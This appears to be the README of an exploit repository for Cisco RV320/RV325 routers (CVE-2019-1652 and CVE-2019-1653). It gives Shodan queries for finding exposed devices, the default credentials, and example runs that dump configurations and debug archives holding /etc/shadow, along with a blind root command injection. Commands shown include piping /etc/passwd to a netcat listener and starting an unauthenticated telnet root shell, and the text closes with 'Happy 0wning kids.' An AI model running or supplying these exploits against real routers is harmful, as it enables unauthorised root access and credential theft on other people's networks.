# CiscoRV320Dump
CVE-2019-1653/CVE-2019-1652 Exploits For Dumping Cisco RV320 Configurations and getting RCE

Implementations of the CVE-2019-1652 and CVE-2019-1653 exploits disclosed by [Red Team Pentesting GmbH](http://www.redteam-pentesting.de).

I only tested these on an RV320, but according to the [Cisco advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info), the RV325 is also vulnerable.

The following [Shodan](https://shodan.io) queries appear to find them, if you are curious about how many are out there. There seems to be quite a few...  
[ssl:RV320](https://www.shodan.io/search?query=ssl%3ARV320)  
[ssl:RV325](https://www.shodan.io/search?query=ssl%3ARV325)  
[port:161 RV325](https://www.shodan.io/search?query=port%3A161+RV325)  
[port:161 RV320](https://www.shodan.io/search?query=port%3A161+RV320)  

The vulnerabilities allow for the following:
* Dumping (Plaintext) Configuration File! (includes hashes for the webUI!)
* Dumping (Encrypted) Diagnostic/Debug Files! (including config, and the /etc and /var directories)
* Decrypting the encrypted Diagnostic/Debug Files! (yes, you get /etc/shadow!)
* Post-Authentication Remote Command Injection as root in the webUI!

As an aside, the default creds are cisco:cisco.

## Exploits...

### Config Dumper Exploit...
For the [configuration dump exploit](https://seclists.org/fulldisclosure/2019/Jan/52), just set target, port, ssl on/off, and output directory. It will dump the configuration to there. 
```
$ python dump_config.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
{*} We seem to have found a valid config! Writing to output/x.x.x.x_8443.conf
$
```

### Debug Data Dumper Exploit...
For the [debug data dumping exploit](https://seclists.org/fulldisclosure/2019/Jan/53), it is the same routine, but the dumped data is larger and encrypted. 
You will want to decrypt this using the provided "decrypt.sh" script, or manually using `openssl`. This will give you a tar file.
The debug output not only gets you the config, but also backups of `/etc` and `/var`, and yes, the `/etc/shadow/` file is present.
I'll eventually rewrite the decryption script in Python, but this was a quick kludge.
```
$ python dump_debug.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/export_debug_msg.exp
{*} We seem to have found a valid encrypted config! Writing to output/x.x.x.x_8443.enc
$ ./decrypt.sh output/x.x.x.x_8443.enc 
Cisco Encrypted Debug Data Decryption Script!
{+} Decrypting output/x.x.x.x_8443.enc
{+} Plaintext should be at output/x.x.x.x_8443.enc.decrypted.tar.gz...
$ 
```

Using the creds you get from these (hashed) you can then exploit [CVE-2019-1652](https://seclists.org/fulldisclosure/2019/Jan/54) to execute commands on the device. 

A few notes on the "hashing" of the password, before we go any further. On these, in the config file, you will find a variable named PASSWD followed by an md5 hash. 
This md5 hash is `md5($password.$auth_key)`, where the auth_key is a static value you can find by doing a `GET /` and parsing. 
There is a seemingly common one that I hardcoded into the RCE exploit as a fallback incase the page parser bullshit regex fails.

### Post-Auth RCE Exploit
CVE-2019-1652 outlines a trivial shell command injection vulnerability, which requires authentication. `exec_cmd.py` implements this, assuming you have valid login creds. "cisco:cisco" is the default, but you could also crack some hashes.

The command injection is blind, so you won't get any output. The environment is an incredibly limited Busybox setup with a crippled netcat, and the boxes are mips64, so I didn't bother writing a reverse-shell exploit this time. You can, however, get command output by doing stuff like `cat /etc/passwd | nc HOST PORT` and having a listener running, or whatever. 

You can also inject a command like `telnetd -l /bin/sh -p 1337` and connect to the resultant telnet service, which will serve you up a nice unauthenticated root shell.

Example run of the exploit below:  
```
$ python exec_cmd.py -t x.x.x.x -s -p 8443 -U cisco -P cisco -c "cat /etc/passwd | nc x.x.x.x 1337"
{+} Sending request to https://x.x.x.x:8443/ to extract auth key...
{*} Got auth_key value: 1964300002
{+} Login Successful, we can proceed!
{+} Ok, now to run your command: cat /etc/passwd | nc x.x.x.x 1337
{+} We don't get output so... Yeah. Shits blind.
$
# on listener...
$ nc -lp 1337
root:x:0:0:root:/:/bin/admin
nobody:x:0:0:nobody:/nonexistent:/bin/false
_lldpd:x:501:501:_lldpd:/:/bin/sh
cisco:x:0:0:root:/bin:/bin/admin

$
```

Happy 0wning kids. 
